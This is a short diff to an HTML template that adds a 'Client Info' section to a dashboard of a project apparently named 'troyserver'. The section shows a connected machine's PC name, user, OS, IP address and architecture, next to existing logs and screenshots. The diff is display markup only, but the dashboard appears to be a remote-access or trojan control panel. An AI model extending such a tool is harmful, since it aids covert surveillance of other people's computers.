@@ -34,6 +34,14 @@
             <!--/*@thymesVar id="log" type="ch.lebois.troyserver.controller.DashboardController"*/-->
             <pre class="log logb" id="log" th:text="${logs}"></pre>
             <br/>
+            <h3>Client Info</h3>
+            <pre style="text-align: left"><span th:text="'Pc Name: ' + ${model.client.pcName}"></span>
+<span th:text="'User: ' + ${model.client.pcuser}"></span>
+<span th:text="'Last seen: ' + ${model.client.lastseen}"></span>
+<span th:text="'OS: ' + ${model.client.os}"></span>
+<span th:text="'Ip: ' + ${model.client.ip}"></span>
+<span th:text="'Arch: ' + ${model.client.arch}"></span></pre>
+            <br/>
             <h3>Screenshots</h3>
             <ul class="w3-ul w3-card-4 w3-hoverable">
                 <li th:each="img:${images}" class="w3-display-container">
